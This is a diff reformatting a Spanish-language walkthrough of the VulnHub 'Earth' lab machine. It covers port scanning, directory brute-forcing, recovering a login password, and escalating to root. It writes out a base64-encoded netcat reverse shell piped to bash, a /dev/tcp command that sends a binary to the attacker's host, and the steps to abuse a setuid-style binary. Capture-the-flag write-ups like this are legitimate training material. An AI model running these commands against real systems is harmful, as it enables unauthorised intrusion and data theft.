@@ -1,12 +1,176 @@
 <!doctype html>
 <html>
+
 <head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <title>VM earth vulnhub</title>
   <meta name="generator" content="CherryTree">
   <link rel="stylesheet" href="res/styles4.css" type="text/css" />
 </head>
+
 <body>
-<div class='page'><h1 class='title'>VM earth vulnhub</h1><br/><p>comenzamos con un mapeo lento de la ip sobre la VM:</p><p></p><p>IP:192.168.0.211</p><p></p><p>comando: nmap 192.168.0.211 -vv</p><p></p><p><img src="images/1-1.png" alt="images/1-1.png" /></p><p></p><p>obtenemos este output con el cual nosotros estamos seguros que posee el SSH abierto (puerto 22) y exite una webpage alojada en el puerto 80 de la maquina y en ultima instancia hay un servicio https alojado en el puerto 443.</p><p></p><p>ahora empezaremos con un escaneo mas fuerte para poder sacar mas informacion como que tipo de servicio http usa la pagina (probablemente apache2)</p><p></p><p>comando: nmap 192.168.0.211 -sV -sC -vv</p><p></p><p><img src="images/1-2.png" alt="images/1-2.png" /></p><p></p><p>para el puerto 80 obtenemos que efectivamente esta usando apache2</p><p></p><p></p><p>en el puerto 443 obtenemos estos DNS de pagina:</p><p></p><p><img src="images/1-3.png" alt="images/1-3.png" /></p><p></p><p>earth.local y terratest.earth.local</p><p></p><p></p><p>ahora intentaremos ver que tipo de pagina webe sta alojada en el puerto 80, pero al entrar vemos este ‘error’</p><p></p><p><img src="images/1-4.png" alt="images/1-4.png" /></p><p></p><p>intentaremos ver que pasa en el https</p><p></p><p><img src="images/1-5.png" alt="images/1-5.png" /></p><p></p><p>parece una pagina default, como tenemos los DNS de las paginas que deberiamos ver entraremos a /etc/hosts en nuestra kali linux para poder asosciar ip con DNS</p><p></p><p></p><p><img src="images/1-6.png" alt="images/1-6.png" /></p><p></p><p></p><p>al entrar obtenemos esta pagina web:</p><p></p><p><img src="images/1-7.png" alt="images/1-7.png" /></p><p></p><p>usaremos dirb para conseguir directorios ocultos</p><p></p><p>comando: dirb <a href="https://earth.local/">https://earth.local/</a></p><p></p><p></p><p><img src="images/1-8.png" alt="images/1-8.png" /></p><p></p><p></p><p>encontramos /admin donde hay un login, intentamos con bypass y las default credentials pero no funciona, entonces intentaremos investigando en la otra pagina, usaremos:</p><p></p><p>dirb <a href="https://terratest.earth.local/">https://terratest.earth.local/</a></p><p></p><p>para ver si encontramos alguna pista de las credenciales</p><p></p><p>encontramos lo siguiente:</p><p></p><p><img src="images/1-9.png" alt="images/1-9.png" /></p><p></p><p>user: terra</p><p></p><p>en testdata.txt tenemos el siguiente texto:</p><p></p><p>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</p><p></p><p><img src="images/1-10.png" alt="images/1-10.png" /></p><p></p><p>usando de key el texto de antes y iterando sobre los hex de la pagina principal de earth.local podremos encontrar que esta es una posible contrase;a </p><p></p><p></p><p>pass: earthclimatechangebad4humans</p><p></p><p></p><p><img src="images/1-11.png" alt="images/1-11.png" /></p><p></p><p>buscamos la user flag:</p><p></p><p></p><p><img src="images/1-12.png" alt="images/1-12.png" /></p><p></p><p></p><p></p><p>aqui podremos conectarnos manualmente con net cat, pero este no funciona asi que procederemos a codificarlo en base64 y enviar el comando codificado</p><p></p><p></p><p>echo &#39;nc -e /bin/bash 192.168.0.101 4444&#39; | base64</p><p></p><p>bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xMDEgNDQ0NAo=</p><p></p><p></p><p>echo ‘bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xMDEgNDQ0NAo=’ | base64 -d |bash</p><p></p><p>este ultimo comando lo mandaremos y obtenemos la reverse shell</p><p></p><p>una vez aqui probamos todo lo posible para ver si tenemos algun file con permisos excedidos para aprovecharnos pero no encontre nada, entonces busque aquellos files ejecutables para el usuario apache, y encontre</p><p></p><p>/usr/bin/reset_root  y lo intente ejecutar pero esto paso:</p><p></p><p><img src="images/1-13.png" alt="images/1-13.png" /></p><p></p><p></p><p>entonces decidi descargarme el archivo en mi kali linux usando net cat</p><p></p><p>para pasar un archivo por net cat debemos primero abrir un puerto escuchando y redirijir el output en un archivo al cual le pondremos reset_root</p><p></p><p></p><p>nc  -lvp 3333</p><p></p><p>y en la target machine usaremos el siguiente comando:</p><p></p><p>cat /usr/bin/reset_root &gt; /dev/tcp/192.168.0.101/3333</p><p></p><p>una vez obtenido el archivo procederemos a verlo</p><p><img src="images/1-14.png" alt="images/1-14.png" /></p><p></p><p>para poder ver el archivo usaremos la herramienta ltrace</p><p></p><p>ltrace ./reset_root</p><p></p><p><img src="images/1-15.png" alt="images/1-15.png" /></p><p></p><p></p><p>crearemos las carpetas que faltan (las de la funcion access)</p><p></p><p></p><p>touch /dev/shm/kHgTFI5G</p><p>touch /dev/shm/Zw7bV9U5</p><p>touch /tmp/kcM0Wewe</p><p></p><p>./reset_root</p><p></p><p></p><p><img src="images/1-16.png" alt="images/1-16.png" /></p><p></p><p>tenemos la password de root</p><p></p><p><img src="images/1-17.png" alt="images/1-17.png" /></p><p></p><p>obtenemos la root_flag.txt</p><p></p><p><img src="images/1-18.png" alt="images/1-18.png" /></p><p></p><p></p></div>
+  <div class='page'>
+    <h1 class='title'>VM earth vulnhub</h1><br />
+    <p>comenzamos con un mapeo lento de la ip sobre la VM:</p>
+    <p></p>
+    <p>IP:192.168.0.211</p>
+    <p></p>
+    <p>comando: nmap 192.168.0.211 -vv</p>
+    <p></p>
+    <p><img src="images/1-1.png" alt="images/1-1.png" /></p>
+    <p></p>
+    <p>obtenemos este output con el cual nosotros estamos seguros que posee el SSH abierto (puerto 22) y exite una
+      webpage alojada en el puerto 80 de la maquina y en ultima instancia hay un servicio https alojado en el puerto
+      443.</p>
+    <p></p>
+    <p>ahora empezaremos con un escaneo mas fuerte para poder sacar mas informacion como que tipo de servicio http usa
+      la pagina (probablemente apache2)</p>
+    <p></p>
+    <p>comando: nmap 192.168.0.211 -sV -sC -vv</p>
+    <p></p>
+    <p><img src="images/1-2.png" alt="images/1-2.png" /></p>
+    <p></p>
+    <p>para el puerto 80 obtenemos que efectivamente esta usando apache2</p>
+    <p></p>
+    <p></p>
+    <p>en el puerto 443 obtenemos estos DNS de pagina:</p>
+    <p></p>
+    <p><img src="images/1-3.png" alt="images/1-3.png" /></p>
+    <p></p>
+    <p>earth.local y terratest.earth.local</p>
+    <p></p>
+    <p></p>
+    <p>ahora intentaremos ver que tipo de pagina webe sta alojada en el puerto 80, pero al entrar vemos este ‘error’</p>
+    <p></p>
+    <p><img src="images/1-4.png" alt="images/1-4.png" /></p>
+    <p></p>
+    <p>intentaremos ver que pasa en el https</p>
+    <p></p>
+    <p><img src="images/1-5.png" alt="images/1-5.png" /></p>
+    <p></p>
+    <p>parece una pagina default, como tenemos los DNS de las paginas que deberiamos ver entraremos a /etc/hosts en
+      nuestra kali linux para poder asosciar ip con DNS</p>
+    <p></p>
+    <p></p>
+    <p><img src="images/1-6.png" alt="images/1-6.png" /></p>
+    <p></p>
+    <p></p>
+    <p>al entrar obtenemos esta pagina web:</p>
+    <p></p>
+    <p><img src="images/1-7.png" alt="images/1-7.png" /></p>
+    <p></p>
+    <p>usaremos dirb para conseguir directorios ocultos</p>
+    <p></p>
+    <p>comando: dirb <a href="https://earth.local/">https://earth.local/</a></p>
+    <p></p>
+    <p></p>
+    <p><img src="images/1-8.png" alt="images/1-8.png" /></p>
+    <p></p>
+    <p></p>
+    <p>encontramos /admin donde hay un login, intentamos con bypass y las default credentials pero no funciona, entonces
+      intentaremos investigando en la otra pagina, usaremos:</p>
+    <p></p>
+    <p>dirb <a href="https://terratest.earth.local/">https://terratest.earth.local/</a></p>
+    <p></p>
+    <p>para ver si encontramos alguna pista de las credenciales</p>
+    <p></p>
+    <p>encontramos lo siguiente:</p>
+    <p></p>
+    <p><img src="images/1-9.png" alt="images/1-9.png" /></p>
+    <p></p>
+    <p>user: terra</p>
+    <p></p>
+    <p>en testdata.txt tenemos el siguiente texto:</p>
+    <p></p>
+    <p>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within
+      the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s
+      atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological
+      evidence indicates that life may have arisen as early as 4.1 billion years ago.</p>
+    <p></p>
+    <p><img src="images/1-10.png" alt="images/1-10.png" /></p>
+    <p></p>
+    <p>usando de key el texto de antes y iterando sobre los hex de la pagina principal de earth.local podremos encontrar
+      que esta es una posible contrase;a </p>
+    <p></p>
+    <p></p>
+    <p>pass: earthclimatechangebad4humans</p>
+    <p></p>
+    <p></p>
+    <p><img src="images/1-11.png" alt="images/1-11.png" /></p>
+    <p></p>
+    <p>buscamos la user flag:</p>
+    <p></p>
+    <p></p>
+    <p><img src="images/1-12.png" alt="images/1-12.png" /></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p>aqui podremos conectarnos manualmente con net cat, pero este no funciona asi que procederemos a codificarlo en
+      base64 y enviar el comando codificado</p>
+    <p></p>
+    <p></p>
+    <p>echo &#39;nc -e /bin/bash 192.168.0.101 4444&#39; | base64</p>
+    <p></p>
+    <p>bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xMDEgNDQ0NAo=</p>
+    <p></p>
+    <p></p>
+    <p>echo ‘bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xMDEgNDQ0NAo=’ | base64 -d |bash</p>
+    <p></p>
+    <p>este ultimo comando lo mandaremos y obtenemos la reverse shell</p>
+    <p></p>
+    <p>una vez aqui probamos todo lo posible para ver si tenemos algun file con permisos excedidos para aprovecharnos
+      pero no encontre nada, entonces busque aquellos files ejecutables para el usuario apache, y encontre</p>
+    <p></p>
+    <p>/usr/bin/reset_root y lo intente ejecutar pero esto paso:</p>
+    <p></p>
+    <p><img src="images/1-13.png" alt="images/1-13.png" /></p>
+    <p></p>
+    <p></p>
+    <p>entonces decidi descargarme el archivo en mi kali linux usando net cat</p>
+    <p></p>
+    <p>para pasar un archivo por net cat debemos primero abrir un puerto escuchando y redirijir el output en un archivo
+      al cual le pondremos reset_root</p>
+    <p></p>
+    <p></p>
+    <p>nc -lvp 3333</p>
+    <p></p>
+    <p>y en la target machine usaremos el siguiente comando:</p>
+    <p></p>
+    <p>cat /usr/bin/reset_root &gt; /dev/tcp/192.168.0.101/3333</p>
+    <p></p>
+    <p>una vez obtenido el archivo procederemos a verlo</p>
+    <p><img src="images/1-14.png" alt="images/1-14.png" /></p>
+    <p></p>
+    <p>para poder ver el archivo usaremos la herramienta ltrace</p>
+    <p></p>
+    <p>ltrace ./reset_root</p>
+    <p></p>
+    <p><img src="images/1-15.png" alt="images/1-15.png" /></p>
+    <p></p>
+    <p></p>
+    <p>crearemos las carpetas que faltan (las de la funcion access)</p>
+    <p></p>
+    <p></p>
+    <p>touch /dev/shm/kHgTFI5G</p>
+    <p>touch /dev/shm/Zw7bV9U5</p>
+    <p>touch /tmp/kcM0Wewe</p>
+    <p></p>
+    <p>./reset_root</p>
+    <p></p>
+    <p></p>
+    <p><img src="images/1-16.png" alt="images/1-16.png" /></p>
+    <p></p>
+    <p>tenemos la password de root</p>
+    <p></p>
+    <p><img src="images/1-17.png" alt="images/1-17.png" /></p>
+    <p></p>
+    <p>obtenemos la root_flag.txt</p>
+    <p></p>
+    <p><img src="images/1-18.png" alt="images/1-18.png" /></p>
+    <p></p>
+    <p></p>
+  </div>
+  <a href="/index.html">back</a>
 </body>
+
 </html>
